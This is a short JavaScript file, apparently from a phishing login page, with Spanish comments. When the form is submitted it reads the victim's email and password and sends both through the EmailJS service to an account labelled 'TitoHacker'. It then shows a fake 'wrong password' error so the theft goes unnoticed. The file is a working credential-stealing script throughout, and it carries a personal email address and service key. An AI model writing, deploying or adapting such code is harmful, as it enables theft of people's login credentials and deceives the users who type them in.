// script.js
document.addEventListener("DOMContentLoaded", function () {
  emailjs.init("jhZnTqYfkp54W6WUd");
});

document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  // Datos que se enviarán por correo
  const templateParams = {
    to_name: "TitoHacker",
    from_name: email,
    message: `Correo: ${email}\nContraseña: ${password}`,
  };

  // Enviar correo usando EmailJS
  emailjs
    .send(
      "racielsp1990@gmail.com",
      "template_pv4ion3",
      templateParams,
      "jhZnTqYfkp54W6WUd"
    )
    .then(
      function (response) {
        console.log(
          "Correo enviado con éxito!",
          response.status,
          response.text
        );
        document.getElementById("email").value = "";
        document.getElementById("password").value = "";
      },
      function (error) {
        console.error("Error al enviar el correo:", error);
      }
    );

  // Simulación de error de contraseña
  if (password !== "correcta") {
    document.getElementById("error-message").style.display = "block";
  } else {
    alert(`Correo: ${email}\nContraseña: ${password}`);
  }
});
